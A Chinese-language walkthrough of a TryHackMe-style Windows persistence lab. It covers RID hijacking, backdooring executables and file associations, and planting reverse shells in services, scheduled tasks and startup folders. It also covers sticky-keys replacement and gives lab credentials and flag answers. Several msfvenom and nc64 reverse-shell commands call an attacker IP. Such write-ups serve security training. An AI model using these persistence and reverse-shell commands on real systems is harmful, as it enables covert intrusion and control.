```
xfreerdp /u:Administrator /p:'Password321' /v:10.10.62.186 +clipboard 

/usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username Administrator -password Password321 
```

# Task 2  Tampering With Unprivileged Accounts

## Assign Group Memberships(分配组成员)

最简单的方法，直接分配到管理员组
```
net localgroup administrators thmuser0 /add
```

缺点就是容易被发现

比较隐蔽的方法，分配到```Backup Operators```组，从而可以读取写入任何文件，包括sam和system，这样就可以随时dump出哈希
```
 net localgroup "Backup Operators" thmuser1 /add
```

如果上面操作以后依然无法完全使用Backup Operators的组能力（被禁用），在注册表下修改,禁用 LocalAccountTokenFilterPolicy
```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```


## Special Privileges and Security Descriptors(特殊权限和安全描述符)

对于 Backup Operators 组，它默认分配有以下两个权限：

SeBackupPrivilege：用户可以读取系统中的任何文件，而忽略任何到位的DACL 。
SeRestorePrivilege：用户可以写入系统中的任何文件，而忽略任何到位的DACL 。

导出配置文件
```
secedit /export /cfg config.inf
```

我们打开文件并将我们的用户添加到配置中有关 SeBackupPrivilege 和 SeRestorePrivilege 的行中

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/765671a0355e2260c44e5a12a10f090e.png)

我们最终将 .inf 文件转换为 .sdb 文件，然后用于将配置加载回系统

```
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

要打开 WinRM 安全描述符的配置窗口，您可以在 Powershell 中使用以下命令（您需要为此使用 GUI 会话）

```
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

给完全控制权限

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/380c80b98c4d1f8c2149ef72427cfeb0.png)


## RID Hijacking(RID 劫持)

RID 是 SID 的最后一位（thmuser3 为 1010，Administrator 为 500）

打开注册表
```
C:\tools\pstools> PsExec64.exe -i -s regedit
```

从Regedit，我们将转到HKLM\SAM\SAM\Domains\Account\Users\机器中每个用户都有一个密钥的地方。由于我们要修改 thmuser3，我们需要搜索其 RID 为十六进制 (1010 = 0x3F2) 的密钥。在对应的键下，会有一个名为F的值，它将用户的有效 RID 保存在 0x30 位置

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/d630140974989748ebcf150ba0696d14.png)

我们现在将这两个字节替换为十六进制管理员的 RID (500 = 0x01F4)，切换字节 (F401)
改为：
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/8f2072b6d13b7343cf7b890586703ddf.png)

下次 thmuser3 登录时，LSASS 会将其与administrator相同的 RID 关联，并授予他们相同的权限


Insert flag1 here
THM{FLAG_BACKED_UP!}

Insert flag2 here
THM{IM_JUST_A_NORMAL_USER}


Insert flag3 here
THM{TRUST_ME_IM_AN_ADMIN}

# Task 3  Backdooring Files

## Executable Files

方法一：直接把shell code注入到正常的程序当中
```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```


方法二：利用快捷方式里“属性”（properties）的target字段，原理为更换为我们的ps文件，在启动源程序的同时执行rev shell

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/7a7349b9dcc5af3180044ee1d7605967.png)

准备一个PS脚本
```
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.13.21.169 4445"

C:\Windows\System32\calc.exe
```

替换快捷方式里面的值
```
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/fe703ddea6135e0c867afcc6f61a8cd2.png)



## Hijacking File Associations(劫持文件关联)

当打开一个txt文件时，系统实际上执行的是
```
%SystemRoot%\system32\NOTEPAD.EXE %1
```

%1代表打开文件的名称

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/c3565cf93de4990f41f41b25aed80571.png)

准备一个PS脚本

```
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.13.21.169 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

修改打开txt文件时，指定执行我们的脚本

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/f7ed25a701cf20ea85cf333b20708ffe.png)

现在当用户点击任何txt文件时都会反弹一个shell

Insert flag5 here
THM{NO_SHORTCUTS_IN_LIFE}

Insert flag6 here
THM{TXT_FILES_WOULD_NEVER_HURT_YOU}

# Task 4  Abusing Services

## Creating backdoor services

通过创建一个自启动的服务，指定自启动的执行完文件，每次开机时返回一个shell

编译一个payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.21.169 LPORT=4448 -f exe-service -o rev-svc.exe
```

开启一个自启服务
```
sc.exe create THMservice2 binPath= "C:\Users\Administrator\Desktop\rev-svc.exe" start= auto
sc.exe start THMservice2
```

重启生效

## Modifying existing services（修改现有服务）

原理跟上面是一样的，只是这里是修改一个原有的，未启动的服务（因为我们未必有创建服务的权限）
```
sc.exe config THMservice3 binPath= "C:\Users\Administrator\Desktop\rev-svc.exe" start= auto obj= "LocalSystem"
```

重启生效

# Task 5  Abusing Scheduled Tasks

新建一个计划任务，反弹shell
```
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.13.21.169 4449" /ru SYSTEM
```

使得上面任务不可见，注册表删除该任务的SD

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/9a6dad473b19be313e3069da0a2fc937.png)

Insert flag9 here
THM{JUST_A_MATTER_OF_TIME}

# Task 6  Logon Triggered Persistence

## 启动文件夹

位置在：
```
C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

msf生成一个rev payload

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.21.169 LPORT=4450 -f exe -o revshell.exe
```

上面生成的payload拷贝到这个文件夹下，所有用户登录都会运行
```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

重新登录触发

## Run / RunOnce

这里是在注册表里设置一个登录运行的程序，位置在

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/c99038cd6cc9e37512edabb1f873a4da.png)


重新登录触发

## Winlogon

同样是改注册表，位置在：
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/dc5fa3e75ff056f11e16c03373799f45.png)

重新登录触发

## Logon scripts

同样是改注册表，位置在：
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/9ce41ee1fc282b8dcacd757b23417b12.png)

重新登录触发


Insert flag10 here
THM{NO_NO_AFTER_YOU}

Insert flag11 here
THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}


Insert flag12 here
THM{I_INSIST_GO_FIRST}


Insert flag13 here
THM{USER_TRIGGERED_PERSISTENCE_FTW}

# Task 7  Backdooring the Login Screen / RDP

这个方法比较骚，第一次见。。

## Sticky Keys

原理是替换粘滞键执行的程序，来达到持久性

如果连续按5次shift键，windows会调用,这里应该是以system权限调用的
```
C:\Windows\System32\sethc.exe
```

假如把sethc.exe替换成cmd.exe，那就可以得到一个system的shell

甚至在登录界面也可以触发

步骤
```
C:\> takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.
```

## Utilman

原理与上面相识

当我们单击登录屏幕上的轻松访问按钮时，windows会以system权限执行
```
C:\Windows\System32\Utilman.exe
```

只要替换成cmd.exe就可以拿到system的shell

```
C:\> takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
        1 file(s) copied.
```

Insert flag14 here
thm{breaking_through_login}


Insert flag15 here
thm{the_login_screen_is_merely_a_suggstion}

# Task 8  Persisting Through Existing Services

## Using Web Shells

就是上传一个web shell，很简单，不多说

## Using MSSQL as a Backdoor

利用mssql的xp_cmdshell能力执行一个PS脚本


Insert flag16 here
THM{EZ_WEB_PERSISTENCE}

Insert flag17 here
THM{I_LIVE_IN_YOUR_DATABASE}